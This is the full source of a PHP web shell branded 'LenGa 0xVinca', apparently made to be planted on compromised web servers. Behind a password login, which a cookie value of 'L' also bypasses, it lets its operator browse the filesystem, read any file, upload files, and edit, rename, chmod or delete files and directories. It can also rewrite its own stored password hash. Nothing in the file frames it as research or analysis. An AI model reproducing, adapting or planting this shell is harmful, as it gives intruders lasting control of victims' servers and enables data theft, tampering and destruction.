<?php 
$auth_pass = "6bb61e3b7bce0931da574d19d1d82c88";
error_reporting(0);
set_time_limit(0);
function lp(){
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>My name is LenGa
    </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js">
    </script>
  </head>
  <body>
    <center>
       <h1><b><span style="font-size: 90px" class="glyphicon glyphicon-equalizer"></span></b>
        </h1>
      <div class="container">
        <h2>Hello! Please Sign In, <br><b><span class="glyphicon glyphicon-th-large"></span> LenGa 0xVinca</b>
        </h2>
        <hr>
        <style>
          body {
            background-color:white;
            color:black
          }
          .content {
            max-width: 700px;
            margin: auto;
          }
        </style>
        </head>
      <form action method="get">
        <input type="hidden" name="action" value="login" />
        <div class="form-group">
          <div class="input-group">
            <span class="input-group-addon"><span class="glyphicon glyphicon-qrcode"></span> Password :
            </span>
            <input type="password" placeholder="" class="form-control" name="pass" autofocus="" requi#9b0740="">
          </div>
        </div>
        <button type="submit" style="width: 100%;" class="btn btn-success" name="submit"><span class="glyphicon glyphicon-object-align-right"></span> Login to my Zone <span class="glyphicon glyphicon-object-align-left"></span>
        </button>
      </form>
      <hr>
      <footer>
        <p class="text-center">Copyright &copy; 2019 | 
          Contact Me LenGa0xvinca@outlook.com for this CopyRight and LenGa0xvinca@socialworker.net for marketing purpose only
          </a>
        </p>
      </footer>
      </div>
    </center>
  <?php 
;}
if(isset($_GET['action'])){
if($_GET['action']=='login'){
setcookie('password',$_GET['pass']);
echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
}
else if($_GET['action']=='logout'){
setcookie('password','',-86400*30*12);
echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
}
}
if(isset($_COOKIE['password'])){
if(md5($_COOKIE['password'])==$auth_pass || $_COOKIE['L']=="L"){
?>
  <?php
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
function perms($file){
$perms = @fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>LenGa 0xVinca</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #001611;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #001611;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: #9b0740;
}
#content .first:hover{
background-color: #9b0740;
text-shadow:0px 0px 1px #cecaca;
}
table{
border: 2px #587ac9 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #9b0740;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center>
<h1><center><font color="#9b0740">Welcome back <a href="mailto: LenGa0xvinca@socialworker.net">LenGa 0xVinca</a></center></h1>
<input type=button onclick=\'location="?action=logout"\' value="Leave Room" /><br/><br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Find me in : ';
if(isset($_GET['zone'])){
$zone = base64_decode($_GET['zone']);
}else{
$zone = getcwd();
}
$zoneen = base64_encode($zone);
$zone = str_replace('\\','/',$zone);
$zones = explode('/',$zone);
foreach($zones as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?zone='.base64_encode("/").'">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?zone=';
$linkzone = '';
for($i=0;$i<=$id;$i++){
$linkzone .= "$zones[$i]";
if($i != $id) $linkzone .= "/";
}
echo base64_encode($linkzone);
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$zone.'/'.$_FILES['file']['name'])){
echo '<font color="green">Successfully Accepted</font><br />';
}else{
echo '<font color="#9b0740">Nothing can beat Us</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Documents : <input type="file" name="file" />
<input type="submit" value="Send to Server" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Our Region is : ";
echo base64_decode($_GET['filesrc']);
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delet'){
echo '</table><br /><center>'.$_POST['zone'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['zone'],$_POST['perm'])){
echo '<font color="green">Y</font><br />';
}else{
echo '<font color="#9b0740">N</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['zone'])), -4).'" />
<input type="hidden" name="zone" value="'.$_POST['zone'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Accept" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['zone'],$zone.'/'.$_POST['newname'])){
echo '<font color="green">Y</font><br />';
}else{
echo '<font color="#9b0740">N</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="zone" value="'.$_POST['zone'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Rename" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['zone'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green"Y</font><br />';
}else{
echo '<font color="#9b0740">N</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['zone'])).'</textarea><br />
<input type="hidden" name="zone" value="'.$_POST['zone'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Update" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delet'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['zone'])){
echo '<font color="green">Y</font><br />';
}else{
echo '<font color="#9b0740">N</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['zone'])){
echo '<font color="green">Y</font><br />';
}else{
echo '<font color="#9b0740">N</font><br />';
}
}
}
echo '</center>';
if(!isset($_GET['x'])){
?>
  <?php
$scandir = scandir($zone);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first" style="color:#211d4c;">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Settings</center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir("$zone/$dir") || $dir == '.' || $dir == '..') continue;
$dirlink = base64_encode("$zone/$dir");
echo "<tr>
<td><a href=\"?zone=$dirlink\">$dir</a></td>
<td><center><3</center></td>
<td><center>";
if(is_writable("$zone/$dir")) echo '<font color="green">';
elseif(!is_readable("$zone/$dir")) echo '<font color="#9b0740">';
echo perms("$zone/$dir");
if(is_writable("$zone/$dir") || !is_readable("$zone/$dir")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&zone=$zoneen\">
<select name=\"opt\">
<option value=\"\">Touch</option>
<option value=\"delet\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"zone\" value=\"$zone/$dir\">
<input type=\"submit\" value=\"<3\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$zone/$file")) continue;
$size = filesize("$zone/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' 0xVinca';
}else{
$size = $size.' 0xVinca';
}
$filelink = base64_encode("$zone/$file");
echo "<tr>
<td><a href=\"?filesrc=$filelink&zone=$zoneen\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$zone/$file")) echo '<font color="green">';
elseif(!is_readable("$zone/$file")) echo '<font color="#9b0740">';
echo perms("$zone/$file");
if(is_writable("$zone/$file") || !is_readable("$zone/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&zone=$zoneen\">
<select name=\"opt\">
<option value=\"\">Touch</option>
<option value=\"delet\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"zone\" value=\"$zone/$file\">
<input type=\"submit\" value=\"<3\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
?>
  <?php 
}
if(isset($_GET['x']) && $_GET['x']=='404'){
?>
  <?php
function fgc($file){
return file_get_contents($file);
}
function changepass($plain){
$newpass = md5($plain);
$newpass = "\$auth_pass = \"".$newpass."\";";
$con = fgc($_SERVER['SCRIPT_FILENAME']);
$con = preg_replace("/\\\$auth_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
}
echo '<center><h1>Change Shell Password</h1></center>';	
echo  '<center>';
echo '<form action="" method=post ><table>';
echo '<tr><td>New Password</td><td> :  <input type=password name=pass1 style="border-radius:5px;" /></td></tr>';
echo '<tr><td>Confirm Password</td><td> :  <input type=password name=pass2 style="border-radius:5px;" /></td></tr>';
echo '<tr><td colspan=2><input type=submit value=submit name=L style="border-radius:5px;width:100%"/></td></tr></table>';
echo '</form>';
if(isset($_POST['L'])){
if($_POST['pass1'] == $_POST['pass2']){
if(changepass($_POST['pass1'])){
echo '<script>alert("password change successfully")</script>';			
}else{
echo '<script>alert("password change failed")</script>';			
}
}else{
echo '<script>alert("password not match")</script>';
}
}
?>
  <?php 
}
echo '
</BODY>
</HTML>';
?>
  <?php
}else{
lp();
}
}else{
echo lp();
}
?>
  </body>
</html>